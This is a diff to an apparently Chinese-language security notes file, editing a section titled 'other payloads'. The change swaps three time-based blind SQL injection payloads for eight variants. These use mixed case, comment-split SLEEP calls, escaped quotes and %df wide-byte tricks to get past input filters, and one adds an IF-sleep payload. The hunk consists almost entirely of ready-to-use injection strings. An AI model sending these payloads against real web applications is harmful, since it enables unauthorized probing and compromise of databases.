@@ -591,9 +591,14 @@ SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS
 #### 其他payload
 
 ```txt
-1'AnD(SElEcT*from(SElEcT%20SlEeP(5))a/**/uNIoN/**/SElEcT%201)='
-1"AnD(SElEcT*from(SElEcT%20SlEeP(5))a/**/uNIoN/**/SElEcT%201)="
-1/**/AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP(8)))smWE)
+1'AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)='
+1"AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)="
+1/**/AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP/**/(6)))smWE)
+1\'AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=\'
+1\"AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=\"
+1%df'AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=%df'
+1%df"AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=%df"
+,(if(1=1,%20sleep/**/(6),0))
 ```
 
 
